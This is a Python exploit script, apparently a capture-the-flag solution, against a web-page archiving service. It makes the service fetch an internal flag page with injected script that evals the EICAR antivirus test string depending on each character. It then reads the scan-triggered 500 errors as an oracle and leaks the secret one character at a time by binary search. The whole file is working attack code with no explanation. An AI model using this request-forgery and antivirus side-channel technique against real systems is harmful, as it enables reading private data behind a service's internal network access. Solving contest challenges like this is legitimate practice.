import requests

URL = "http://192.168.122.78" # changeme

def randstr(n=8):
    import random
    import string
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join([random.choice(chars) for _ in range(n)])

def trigger(c, idx, sess):
    import string
    prefix = randstr()
    p = prefix + '''<script>f=function(n){eval('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H'+{${c}:'*'}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));</script><body>'''
    p = string.Template(p).substitute({'idx': idx, 'c': c})
    req = sess.post(URL + '/gyotaku', data={'url': 'http://127.0.0.1/flag?a=' + p})
    return req.json()

def leak(idx, sess):
    l, h = 0, 0x100
    while h - l > 1:
        m = (h + l) // 2
        gid = trigger(m, idx, sess)
        if sess.get(URL + '/gyotaku/' + gid).status_code == 500:
            l = m
        else:
            h = m
    return chr(l)

sess = requests.session()
sess.post(URL + '/login', data={'username': '</body>'+randstr(), 'password': randstr()})

data = ''
for i in range(30):
    data += leak(i, sess)
    print(data)
